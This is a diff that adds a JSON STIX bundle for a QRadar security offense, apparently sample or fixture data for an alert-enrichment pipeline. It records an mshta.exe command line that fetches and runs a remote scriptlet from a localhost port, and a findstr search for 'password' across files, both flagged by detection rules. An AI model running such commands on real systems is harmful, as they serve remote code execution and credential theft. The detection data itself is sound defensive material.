@@ -1,0 +1,719 @@
+{
+	"stix_bundle": {
+		"type": "bundle",
+		"id": "bundle--392c7252-6b51-5f37-b890-c95b12901bc0",
+		"objects": [
+			{
+				"type": "x-ibm-finding",
+				"id": "x-ibm-finding--ca18cabf-8cfe-442b-b3f2-0890a5984ca6",
+				"spec_version": "2.1",
+				"event_ids": [],
+				"event_type": "ALERT",
+				"truncated": false,
+				"name": "QRadar Offense - Magnitude 6",
+				"description": "QRadar Offense - Magnitude 6",
+				"customer_id": "da497f16-b998-4a40-9631-0a3ed33ade10",
+				"data_source_id": "599f7d52-b58e-4eb3-b2b1-0e59856672ee",
+				"qid_data_source_type_id": 514,
+				"qid": 130500011,
+				"qid_event_id": "qradar_offense_magnitude_6",
+				"qid_event_category": "IBMSecurityQRadar",
+				"protocol_config_id": 0,
+				"low_level_categories": [
+					8055
+				],
+				"original_time": "2022-12-07T19:16:26.139Z",
+				"receive_time": "2022-12-07T19:16:26.01Z",
+				"parse_time": "2022-12-07T19:16:26.092Z",
+				"storage_time": "1969-12-31T23:59:59.999Z",
+				"external_mitre_ids": [],
+				"mitre_ids": [],
+				"data_source_type_id": 514,
+				"data_source_type_categories": [],
+				"external_detection_id": "",
+				"external_alert_id": "",
+				"internal_account_id": "da497f16-b998-4a40-9631-0a3ed33ade10",
+				"external_severity": "",
+				"severity": 9,
+				"external_credibility": "",
+				"credibility": 5,
+				"retention_bucket": 0,
+				"observable_ref_list": [
+					{
+						"context": "",
+						"observable_ref": "directory--737cb2ab-e1ce-5f13-8718-93ab319bc041",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "directory--77d95dba-cc87-50dd-8d2b-f1d8edaf2768",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "directory--77d95dba-cc87-50dd-8d2b-f1d8edaf2768",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "directory--bf7039a5-3e5e-5391-845a-b2fb6a54b5b3",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "domain-name--b54e23fc-08b6-5d8e-b593-bf0dfc0a49d5",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "file--8bd494fa-74f7-5583-b379-470b2288b3c4",
+						"time_observed": "2022-12-07T19:16:26.11Z"
+					},
+					{
+						"context": "file.child",
+						"observable_ref": "file--4ac0fb4d-fbd2-5eec-b46e-05532b161bb6",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "file.parent",
+						"observable_ref": "file--6b138ef4-b178-5ebe-bdc7-00023e9931c8",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "file.child",
+						"observable_ref": "file--48290750-c5fd-5a32-bc11-197a87a10fc7",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "file.parent",
+						"observable_ref": "file--f0ddedbf-cbad-592a-b9d7-1628ed3fc20f",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "Source IP",
+						"observable_ref": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+						"time_observed": "2022-12-07T19:16:26.101Z"
+					},
+					{
+						"context": "Destination IP",
+						"observable_ref": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+						"time_observed": "2022-12-07T19:16:26.103Z"
+					},
+					{
+						"context": "ip.dst",
+						"observable_ref": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+						"time_observed": "2022-12-07T19:16:26.11Z"
+					},
+					{
+						"context": "ip.src",
+						"observable_ref": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "ip.dst",
+						"observable_ref": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "ip.src",
+						"observable_ref": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "ip.dst",
+						"observable_ref": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+						"time_observed": "2022-12-07T19:16:26.114Z"
+					},
+					{
+						"context": "ip.src",
+						"observable_ref": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+						"time_observed": "2022-12-07T19:16:26.114Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "network-traffic--97c474d6-803f-5d64-924a-ab21556ec2b2",
+						"time_observed": "2022-12-07T19:16:26.103Z"
+					},
+					{
+						"context": "process.child",
+						"observable_ref": "process--4a6bd313-02e4-4015-a5e4-575ec368fc83",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "process.parent",
+						"observable_ref": "process--d9d8b3e4-cd41-4948-a2dd-5087bb9c3aa4",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "process.child",
+						"observable_ref": "process--05bcb861-3f5c-4b63-963a-0ef77a8ed8f2",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "process.parent",
+						"observable_ref": "process--b4a097e1-fb97-4a4e-a91a-b6bcddd3df0f",
+						"time_observed": "2022-12-07T19:16:26.113Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "user-account--2838785b-9c11-5dfb-a9e2-024e64ba1382",
+						"time_observed": "2022-12-07T19:16:26.111Z"
+					},
+					{
+						"context": "",
+						"observable_ref": "user-account--2838785b-9c11-5dfb-a9e2-024e64ba1382",
+						"time_observed": "2022-12-07T19:16:26.114Z"
+					}
+				]
+			},
+			{
+				"type": "directory",
+				"id": "directory--737cb2ab-e1ce-5f13-8718-93ab319bc041",
+				"spec_version": "2.1",
+				"path_enc": "",
+				"contains_refs": [
+					"file--4ac0fb4d-fbd2-5eec-b46e-05532b161bb6"
+				],
+				"path": "C:\\Users\\Administrator\\Downloads\\SysWOW64\\",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "directory",
+				"id": "directory--77d95dba-cc87-50dd-8d2b-f1d8edaf2768",
+				"spec_version": "2.1",
+				"path_enc": "",
+				"contains_refs": [
+					"file--6b138ef4-b178-5ebe-bdc7-00023e9931c8"
+				],
+				"path": "C:\\Windows\\System32\\",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "directory",
+				"id": "directory--77d95dba-cc87-50dd-8d2b-f1d8edaf2768",
+				"spec_version": "2.1",
+				"path_enc": "",
+				"contains_refs": [
+					"file--48290750-c5fd-5a32-bc11-197a87a10fc7"
+				],
+				"path": "C:\\Windows\\System32\\",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "directory",
+				"id": "directory--bf7039a5-3e5e-5391-845a-b2fb6a54b5b3",
+				"spec_version": "2.1",
+				"path_enc": "",
+				"contains_refs": [
+					"file--f0ddedbf-cbad-592a-b9d7-1628ed3fc20f"
+				],
+				"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "domain-name",
+				"id": "domain-name--b54e23fc-08b6-5d8e-b593-bf0dfc0a49d5",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"value": "localhost"
+			},
+			{
+				"type": "file",
+				"id": "file--8bd494fa-74f7-5583-b379-470b2288b3c4",
+				"spec_version": "2.1",
+				"size": -1,
+				"name_enc": "",
+				"magic_number_hex": "",
+				"mime_type": "",
+				"contains_refs": [
+					""
+				],
+				"content_ref": "",
+				"hashes": {
+					"SHA_512": "",
+					"SHA_256": "",
+					"SHA_1": "",
+					"MD5": ""
+				},
+				"name": "regedit.exe",
+				"parent_directory_ref": "",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "file",
+				"id": "file--4ac0fb4d-fbd2-5eec-b46e-05532b161bb6",
+				"spec_version": "2.1",
+				"size": -1,
+				"name_enc": "",
+				"magic_number_hex": "",
+				"mime_type": "",
+				"contains_refs": [
+					""
+				],
+				"content_ref": "",
+				"hashes": {
+					"SHA_512": "",
+					"SHA_256": "12C94C614FB752DC1F6797B5FB3AD67719E3C924FACDA35DC36792C8E5AC45FC",
+					"SHA_1": "",
+					"MD5": "4DBAFC3C0B7A9CAA67D6C2C3D99422F2"
+				},
+				"name": "mshta.exe",
+				"parent_directory_ref": "directory--737cb2ab-e1ce-5f13-8718-93ab319bc041",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "file",
+				"id": "file--6b138ef4-b178-5ebe-bdc7-00023e9931c8",
+				"spec_version": "2.1",
+				"size": -1,
+				"name_enc": "",
+				"magic_number_hex": "",
+				"mime_type": "",
+				"contains_refs": [
+					""
+				],
+				"content_ref": "",
+				"hashes": {
+					"SHA_512": "",
+					"SHA_256": "",
+					"SHA_1": "",
+					"MD5": ""
+				},
+				"name": "cmd.exe",
+				"parent_directory_ref": "directory--77d95dba-cc87-50dd-8d2b-f1d8edaf2768",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "file",
+				"id": "file--48290750-c5fd-5a32-bc11-197a87a10fc7",
+				"spec_version": "2.1",
+				"size": -1,
+				"name_enc": "",
+				"magic_number_hex": "",
+				"mime_type": "",
+				"contains_refs": [
+					""
+				],
+				"content_ref": "",
+				"hashes": {
+					"SHA_512": "",
+					"SHA_256": "750AB5E1F3EB18CC42A4A4C7BAB27753F6B26FB9752AD3861833753091044281",
+					"SHA_1": "",
+					"MD5": "DC0816790EFA08AA5B55C1EECFDDB525"
+				},
+				"name": "findstr.exe",
+				"parent_directory_ref": "directory--77d95dba-cc87-50dd-8d2b-f1d8edaf2768",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "file",
+				"id": "file--f0ddedbf-cbad-592a-b9d7-1628ed3fc20f",
+				"spec_version": "2.1",
+				"size": -1,
+				"name_enc": "",
+				"magic_number_hex": "",
+				"mime_type": "",
+				"contains_refs": [
+					""
+				],
+				"content_ref": "",
+				"hashes": {
+					"SHA_512": "",
+					"SHA_256": "",
+					"SHA_1": "",
+					"MD5": ""
+				},
+				"name": "powershell.exe",
+				"parent_directory_ref": "directory--bf7039a5-3e5e-5391-845a-b2fb6a54b5b3",
+				"ctime": "1969-12-31T23:59:59.999Z",
+				"mtime": "1969-12-31T23:59:59.999Z",
+				"atime": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "127.0.0.1"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "127.0.0.1"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "172.16.89.201"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "172.16.89.201"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "172.16.89.201"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "172.16.89.201"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "172.16.89.201"
+			},
+			{
+				"type": "ipv4-addr",
+				"id": "ipv4-addr--be2c498e-490d-5c2b-bd8c-2bb79b4f2317",
+				"spec_version": "2.1",
+				"resolves_to_refs": [
+					""
+				],
+				"belongs_to_refs": [
+					""
+				],
+				"value": "172.16.89.201"
+			},
+			{
+				"type": "mac-addr",
+				"id": "mac-addr--48fb9f9d-9359-5d38-8e1a-f084bac8652d",
+				"spec_version": "2.1",
+				"value": "00:00:00:00:00:00"
+			},
+			{
+				"type": "mac-addr",
+				"id": "mac-addr--48fb9f9d-9359-5d38-8e1a-f084bac8652d",
+				"spec_version": "2.1",
+				"value": "00:00:00:00:00:00"
+			},
+			{
+				"type": "mac-addr",
+				"id": "mac-addr--48fb9f9d-9359-5d38-8e1a-f084bac8652d",
+				"spec_version": "2.1",
+				"value": "00:00:00:00:00:00"
+			},
+			{
+				"type": "mac-addr",
+				"id": "mac-addr--48fb9f9d-9359-5d38-8e1a-f084bac8652d",
+				"spec_version": "2.1",
+				"value": "00:00:00:00:00:00"
+			},
+			{
+				"type": "mac-addr",
+				"id": "mac-addr--48fb9f9d-9359-5d38-8e1a-f084bac8652d",
+				"spec_version": "2.1",
+				"value": "00:00:00:00:00:00"
+			},
+			{
+				"type": "mac-addr",
+				"id": "mac-addr--48fb9f9d-9359-5d38-8e1a-f084bac8652d",
+				"spec_version": "2.1",
+				"value": "00:00:00:00:00:00"
+			},
+			{
+				"type": "network-traffic",
+				"id": "network-traffic--97c474d6-803f-5d64-924a-ab21556ec2b2",
+				"spec_version": "2.1",
+				"is_active": false,
+				"src_byte_count": -1,
+				"dst_byte_count": -1,
+				"src_packets": -1,
+				"dst_packets": -1,
+				"src_payload_ref": "",
+				"dst_payload_ref": "",
+				"encapsulates_refs": [
+					""
+				],
+				"encapsulated_by_ref": "",
+				"src_ref": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+				"dst_ref": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+				"src_port": 0,
+				"dst_port": 0,
+				"protocols": [
+					"255"
+				],
+				"start": "1969-12-31T23:59:59.999Z",
+				"end": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "process",
+				"id": "process--4a6bd313-02e4-4015-a5e4-575ec368fc83",
+				"spec_version": "2.1",
+				"is_hidden": false,
+				"pid": -1,
+				"cwd": "",
+				"command_line": "mshta.exe   javascript:a=(GetObject(\"script:http://localhost:1337/m.sct\")).Exec();close();",
+				"environment_variables": {
+					"": ""
+				},
+				"opened_connection_refs": [
+					""
+				],
+				"creator_user_ref": "",
+				"image_ref": "file--4ac0fb4d-fbd2-5eec-b46e-05532b161bb6",
+				"parent_ref": "process--d9d8b3e4-cd41-4948-a2dd-5087bb9c3aa4",
+				"child_refs": [
+					""
+				],
+				"created_time": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "process",
+				"id": "process--d9d8b3e4-cd41-4948-a2dd-5087bb9c3aa4",
+				"spec_version": "2.1",
+				"is_hidden": false,
+				"pid": -1,
+				"cwd": "",
+				"command_line": "\"C:\\Windows\\system32\\cmd.exe\"  ParentUser: EC2AMAZ-MEGG0K0\\Administrator",
+				"environment_variables": {
+					"": ""
+				},
+				"opened_connection_refs": [
+					""
+				],
+				"creator_user_ref": "",
+				"image_ref": "file--6b138ef4-b178-5ebe-bdc7-00023e9931c8",
+				"parent_ref": "",
+				"child_refs": [
+					"process--4a6bd313-02e4-4015-a5e4-575ec368fc83"
+				],
+				"created_time": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "process",
+				"id": "process--05bcb861-3f5c-4b63-963a-0ef77a8ed8f2",
+				"spec_version": "2.1",
+				"is_hidden": false,
+				"pid": -1,
+				"cwd": "",
+				"command_line": "\"C:\\Windows\\system32\\findstr.exe\" password *.*",
+				"environment_variables": {
+					"": ""
+				},
+				"opened_connection_refs": [
+					""
+				],
+				"creator_user_ref": "",
+				"image_ref": "file--48290750-c5fd-5a32-bc11-197a87a10fc7",
+				"parent_ref": "process--b4a097e1-fb97-4a4e-a91a-b6bcddd3df0f",
+				"child_refs": [
+					""
+				],
+				"created_time": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "process",
+				"id": "process--b4a097e1-fb97-4a4e-a91a-b6bcddd3df0f",
+				"spec_version": "2.1",
+				"is_hidden": false,
+				"pid": -1,
+				"cwd": "",
+				"command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  ParentUser: EC2AMAZ-MEGG0K0\\Administrator",
+				"environment_variables": {
+					"": ""
+				},
+				"opened_connection_refs": [
+					""
+				],
+				"creator_user_ref": "",
+				"image_ref": "file--f0ddedbf-cbad-592a-b9d7-1628ed3fc20f",
+				"parent_ref": "",
+				"child_refs": [
+					"process--05bcb861-3f5c-4b63-963a-0ef77a8ed8f2"
+				],
+				"created_time": "1969-12-31T23:59:59.999Z"
+			},
+			{
+				"type": "user-account",
+				"id": "user-account--2838785b-9c11-5dfb-a9e2-024e64ba1382",
+				"spec_version": "2.1",
+				"credential": "",
+				"display_name": "",
+				"is_service_account": false,
+				"is_privileged": false,
+				"can_escalate_privs": false,
+				"is_disabled": false,
+				"user_id": "Administrator",
+				"account_login": "",
+				"account_type": "",
+				"account_created": "1969-12-31T23:59:59.999Z",
+				"account_expires": "1970-01-01T00:00:00.001Z",
+				"credential_last_changed": "1970-01-01T00:00:00.001Z",
+				"account_first_login": "1970-01-01T00:00:00.001Z",
+				"account_last_login": "1970-01-01T00:00:00.001Z"
+			},
+			{
+				"type": "user-account",
+				"id": "user-account--2838785b-9c11-5dfb-a9e2-024e64ba1382",
+				"spec_version": "2.1",
+				"credential": "",
+				"display_name": "",
+				"is_service_account": false,
+				"is_privileged": false,
+				"can_escalate_privs": false,
+				"is_disabled": false,
+				"user_id": "Administrator",
+				"account_login": "",
+				"account_type": "",
+				"account_created": "1969-12-31T23:59:59.999Z",
+				"account_expires": "1970-01-01T00:00:00.001Z",
+				"credential_last_changed": "1970-01-01T00:00:00.001Z",
+				"account_first_login": "1970-01-01T00:00:00.001Z",
+				"account_last_login": "1970-01-01T00:00:00.001Z"
+			}
+		]
+	},
+	"enrichments": {
+		"process--4a6bd313-02e4-4015-a5e4-575ec368fc83": {
+			"cumulative_severity": 0.1,
+			"enrichments": [
+				{
+					"category": "Commonly Abused Windows Applications",
+					"description": "Execution of Windows application that can be used to can be used by an attacker to circumvent application allow policies: mshta.exe   javascript:a=(GetObject(\"script:http://localhost:1337/m.sct\")).Exec();close();",
+					"module": "RULE_ENGINE:8fc70818-86ea-4863-aea7-511d1df97370:{\"name\":\"Commonly Abused Windows Applications\",\"id\":\"093c596e-27d4-46a4-a2b7-c35779d62556\",\"version\":4,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/093c596e-27d4-46a4-a2b7-c35779d62556?version=4\"}",
+					"timestamp": 1670440587338,
+					"severity": 0.1
+				}
+			]
+		},
+		"ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b": {
+			"cumulative_severity": -1,
+			"enrichments": [
+				{
+					"category": "Known IP Address",
+					"description": "Localhost IPv4 address observed: 127.0.0.1",
+					"module": "RULE_ENGINE:99703564-1621-4684-a50b-966baa8dd525:{\"name\":\"Localhost IPv4 Address\",\"id\":\"b58379cb-fcd1-4652-ae5d-6048acbb3330\",\"version\":1,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/b58379cb-fcd1-4652-ae5d-6048acbb3330?version=1\"}",
+					"timestamp": 1670440587338,
+					"severity": -1
+				}
+			]
+		},
+		"x-ibm-finding--ca18cabf-8cfe-442b-b3f2-0890a5984ca6": {
+			"cumulative_severity": 0.3,
+			"enrichments": [
+				{
+					"category": "Vendor Severity",
+					"description": "Normalized severity set by detection source: 0.3",
+					"module": "RULE_ENGINE:33f3da62-46fd-46b9-bd2f-5d6bfddc04b7:{\"name\":\"Vendor Severity\",\"id\":\"c0b9ed2b-23b6-456b-856c-d3c17a3bd834\",\"version\":4,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/c0b9ed2b-23b6-456b-856c-d3c17a3bd834?version=4\"}",
+					"timestamp": 1670440587338,
+					"severity": 0.3
+				}
+			]
+		},
+		"process--05bcb861-3f5c-4b63-963a-0ef77a8ed8f2": {
+			"cumulative_severity": 0.3,
+			"enrichments": [
+				{
+					"category": "Search for Password Files",
+					"description": "Search for password files performed: \"C:\\Windows\\system32\\findstr.exe\" password *.*",
+					"module": "RULE_ENGINE:1c3a0682-03bc-4445-a1d4-0efaf9fd0c05:{\"name\":\"Search for Password Files\",\"id\":\"424a6d97-7ca6-4f8a-ba57-cca441456b4f\",\"version\":4,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/424a6d97-7ca6-4f8a-ba57-cca441456b4f?version=4\"}",
+					"timestamp": 1670440587338,
+					"severity": 0.3
+				}
+			]
+		}
+	},
+	"correlation_keys": [
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:file--4ac0fb4d-fbd2-5eec-b46e-05532b161bb6"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:file--8bd494fa-74f7-5583-b379-470b2288b3c4"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:file--48290750-c5fd-5a32-bc11-197a87a10fc7"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:process--05bcb861-3f5c-4b63-963a-0ef77a8ed8f2"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:process--b4a097e1-fb97-4a4e-a91a-b6bcddd3df0f"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:process--d9d8b3e4-cd41-4948-a2dd-5087bb9c3aa4"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:directory--737cb2ab-e1ce-5f13-8718-93ab319bc041"
+		},
+		{
+			"module": "RULE_ENGINE:f8ae0106-43f5-4b52-9eda-9b6a44e9360a:{\"name\":\"Correlation conditions\",\"id\":\"91dfadf3-90c9-490b-94b6-a07288809b6e\",\"version\":16,\"api_relative_path\":\"api/drc/v1/rules/da497f16-b998-4a40-9631-0a3ed33ade10/91dfadf3-90c9-490b-94b6-a07288809b6e?version=16\",\"correlationConditionsMeta\":[{\"name\":\"directory\"},{\"name\":\"endpoint\"},{\"name\":\"file\"},{\"name\":\"ipv4\"},{\"name\":\"process\"},{\"name\":\"registry_key\"},{\"name\":\"url\"},{\"name\":\"user\"}]}",
+			"correlation_key": "da497f16-b998-4a40-9631-0a3ed33ade10:process--4a6bd313-02e4-4015-a5e4-575ec368fc83"
+		}
+	]
+}
